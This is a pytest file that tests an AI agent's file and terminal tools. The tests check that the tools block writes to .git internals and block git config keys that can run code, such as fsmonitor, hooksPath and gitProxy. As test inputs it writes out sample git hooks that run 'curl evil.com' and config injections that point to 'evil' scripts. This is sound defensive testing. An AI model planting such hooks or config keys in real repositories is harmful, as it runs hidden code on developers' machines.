"""
Tests for bare git repo defenses:
- file_write / file_edit / file_edit_batch block writes to .git internals
- terminal_exec blocks dangerous git config keys (core.fsmonitor, etc.)
"""
import os
import sys
import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)


# ── Helper: ensure workspace fixture is accessible ──────────────────────────

@pytest.fixture
def workspace(tmp_path):
    import config
    config.WORKSPACE_DIR = str(tmp_path)
    return str(tmp_path)


# ── file_write defenses ──────────────────────────────────────────────────────

def test_write_to_git_config_blocked(workspace):
    """file_write to .git/config must be blocked."""
    from agent.tools.file_ops import file_write

    result = file_write.invoke({"file_path": os.path.join(workspace, ".git", "config"), "content": "[core]\n\tfsmonitor = evil"})
    assert "blocked" in result.lower() or "\u26d4" in result, f"Expected block, got: {result}"


def test_write_to_git_hooks_blocked(workspace):
    """file_write to .git/hooks/pre-commit must be blocked."""
    from agent.tools.file_ops import file_write

    result = file_write.invoke({"file_path": os.path.join(workspace, ".git", "hooks", "pre-commit"), "content": "#!/bin/sh\ncurl evil.com"})
    assert "blocked" in result.lower() or "\u26d4" in result, f"Expected block, got: {result}"


def test_write_to_git_objects_blocked(workspace):
    """file_write to .git/objects/abc must be blocked."""
    from agent.tools.file_ops import file_write

    result = file_write.invoke({"file_path": os.path.join(workspace, ".git", "objects", "abc"), "content": "malicious"})
    assert "blocked" in result.lower() or "\u26d4" in result, f"Expected block, got: {result}"


def test_write_to_git_head_blocked(workspace):
    """file_write to .git/HEAD must be blocked."""
    from agent.tools.file_ops import file_write

    result = file_write.invoke({"file_path": os.path.join(workspace, ".git", "HEAD"), "content": "ref: refs/heads/evil"})
    assert "blocked" in result.lower() or "\u26d4" in result, f"Expected block, got: {result}"


def test_write_to_git_refs_blocked(workspace):
    """file_write to .git/refs/heads/main must be blocked."""
    from agent.tools.file_ops import file_write

    result = file_write.invoke({"file_path": os.path.join(workspace, ".git", "refs", "heads", "main"), "content": "deadbeef"})
    assert "blocked" in result.lower() or "\u26d4" in result, f"Expected block, got: {result}"


def test_normal_file_write_allowed(workspace):
    """file_write to a normal source file must succeed."""
    from agent.tools.file_ops import file_write

    target = os.path.join(workspace, "src", "foo.py")
    result = file_write.invoke({"file_path": target, "content": "# hello\n"})
    assert "Written" in result or "written" in result.lower(), f"Expected success, got: {result}"
    assert os.path.isfile(target)


# ── file_edit defense ────────────────────────────────────────────────────────

def test_file_edit_git_config_blocked(workspace):
    """file_edit on .git/config must be blocked even if the file exists."""
    from agent.tools.file_ops import file_write, file_edit

    git_dir = os.path.join(workspace, ".git")
    os.makedirs(git_dir, exist_ok=True)
    cfg_path = os.path.join(git_dir, "config")
    # Write directly (bypassing the tool) so the file exists for edit to find
    with open(cfg_path, "w") as f:
        f.write("[core]\n\trepositoryformatversion = 0\n")

    result = file_edit.invoke({
        "file_path": cfg_path,
        "old_string": "repositoryformatversion = 0",
        "new_string": "repositoryformatversion = 0\n\tfsmonitor = evil",
    })
    assert "blocked" in result.lower() or "\u26d4" in result, f"Expected block, got: {result}"


# ── file_edit_batch defense ──────────────────────────────────────────────────

def test_file_edit_batch_git_hooks_blocked(workspace):
    """file_edit_batch that touches .git/hooks must be blocked."""
    from agent.tools.file_ops import file_edit_batch

    git_hooks = os.path.join(workspace, ".git", "hooks")
    os.makedirs(git_hooks, exist_ok=True)
    hook_path = os.path.join(git_hooks, "post-checkout")
    with open(hook_path, "w") as f:
        f.write("#!/bin/sh\necho ok\n")

    result = file_edit_batch.invoke({"edits": [
        {"file_path": hook_path, "old_string": "echo ok", "new_string": "curl evil.com"},
    ]})
    assert "blocked" in result.lower() or "\u26d4" in result, f"Expected block, got: {result}"


# ── terminal_exec defenses ───────────────────────────────────────────────────

def test_git_fsmonitor_command_blocked():
    """terminal_exec with git config core.fsmonitor must be blocked."""
    from agent.tools.terminal import terminal_exec

    result = terminal_exec.invoke({"command": "git config core.fsmonitor 'evil_script.sh'"})
    assert "blocked" in result.lower() or "Git config key blocked" in result, f"Expected block, got: {result}"


def test_git_hookspath_command_blocked():
    """terminal_exec with git config core.hooksPath must be blocked."""
    from agent.tools.terminal import terminal_exec

    result = terminal_exec.invoke({"command": "git config --global core.hooksPath /tmp/evil"})
    assert "blocked" in result.lower() or "Git config key blocked" in result, f"Expected block, got: {result}"


def test_git_gitproxy_command_blocked():
    """terminal_exec with git config core.gitProxy must be blocked."""
    from agent.tools.terminal import terminal_exec

    result = terminal_exec.invoke({"command": "git config core.gitProxy 'evil-proxy-cmd'"})
    assert "blocked" in result.lower() or "Git config key blocked" in result, f"Expected block, got: {result}"


def test_git_normal_config_allowed():
    """terminal_exec with a safe git config key (user.email) must NOT be blocked."""
    from agent.tools.terminal import terminal_exec

    # We only need to verify it is not blocked by our defence — don't care if git isn't installed
    result = terminal_exec.invoke({"command": "git config user.email 'test@example.com'"})
    assert "Git config key blocked" not in result, f"Should not be blocked, got: {result}"


# ── _is_git_internal_write unit tests ────────────────────────────────────────

def test_is_git_internal_write_detects_config():
    from agent.tools.file_ops import _is_git_internal_write
    assert _is_git_internal_write("/repo/.git/config") is True


def test_is_git_internal_write_detects_hooks():
    from agent.tools.file_ops import _is_git_internal_write
    assert _is_git_internal_write("/repo/.git/hooks/pre-commit") is True


def test_is_git_internal_write_detects_objects():
    from agent.tools.file_ops import _is_git_internal_write
    assert _is_git_internal_write("/repo/.git/objects/pack/abc") is True


def test_is_git_internal_write_detects_refs():
    from agent.tools.file_ops import _is_git_internal_write
    assert _is_git_internal_write("/repo/.git/refs/heads/main") is True


def test_is_git_internal_write_allows_normal_file():
    from agent.tools.file_ops import _is_git_internal_write
    assert _is_git_internal_write("/repo/src/foo.py") is False


def test_is_git_internal_write_allows_git_dir_itself():
    from agent.tools.file_ops import _is_git_internal_write
    # Writing to .git/ itself (the directory) is fine — only internals are blocked
    assert _is_git_internal_write("/repo/.git") is False


def test_is_git_internal_write_allows_dotgit_in_filename():
    from agent.tools.file_ops import _is_git_internal_write
    # A file named like ".gitignore" must not be blocked
    assert _is_git_internal_write("/repo/.gitignore") is False
    assert _is_git_internal_write("/repo/.github/workflows/ci.yml") is False
